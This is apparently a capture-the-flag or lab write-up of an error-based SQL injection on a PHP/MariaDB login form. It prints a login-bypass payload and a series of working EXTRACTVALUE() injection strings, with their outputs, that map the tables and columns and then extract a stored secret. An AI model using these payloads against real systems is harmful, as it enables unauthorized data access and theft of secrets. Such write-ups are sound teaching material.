First, the payload admin'+or+1='1'--+- worked successfully but didn’t lead anywhere meaningful — it bypassed login but didn’t reveal anything useful.

I found that the backend database is MariaDB, which is compatible with the mysqli extension in PHP. So I tried exploiting a SQL injection through error-based techniques supported by MariaDB. Specifically, I used the EXTRACTVALUE() function to trigger an error and leak data.

In the username field, I submitted the following payload:

d' AND EXTRACTVALUE(1337, CONCAT(0x7e, (SELECT value FROM secrets), 0x7e))--+-
This produced the following error response:

XPATH syntax error: '~some_value_here~'
This confirmed that the SQL injection is working, and I could extract data from the database using this method.

Then I started mapping the database. First, I identified the current database name using:

AND EXTRACTVALUE(1337, CONCAT(0x7e, (SELECT database()), 0x7e))--+-
It returned:
~app~

I listed the tables inside the app database using:

AND EXTRACTVALUE(1337, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='app' LIMIT 0,1), 0x7e))--+-
And iterated the LIMIT to get the full list. I found two tables: users and secrets. I ignored the users table and focused on secrets.

To understand the structure of secrets, I extracted the column names using:

AND EXTRACTVALUE(1337, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='secrets' AND table_schema='app' LIMIT 0,1), 0x7e))--+-
I discovered that the secrets table has two columns: name and value.

I then checked the number of rows:

AND EXTRACTVALUE(1337, CONCAT(0x7e, (SELECT COUNT(*) FROM secrets), 0x7e))--+-
It returned 1, meaning there is only one row in the secrets table.

Since EXTRACTVALUE() only accepts a single column in its subquery, using SELECT * or trying to extract both name and value together caused an error:

Operand should contain 1 column(s)
So I focused on extracting just the value column:

AND EXTRACTVALUE(1337, CONCAT(0x7e, (SELECT value FROM secrets LIMIT 0,1), 0x7e))--+-
This gave the secret value successfully.
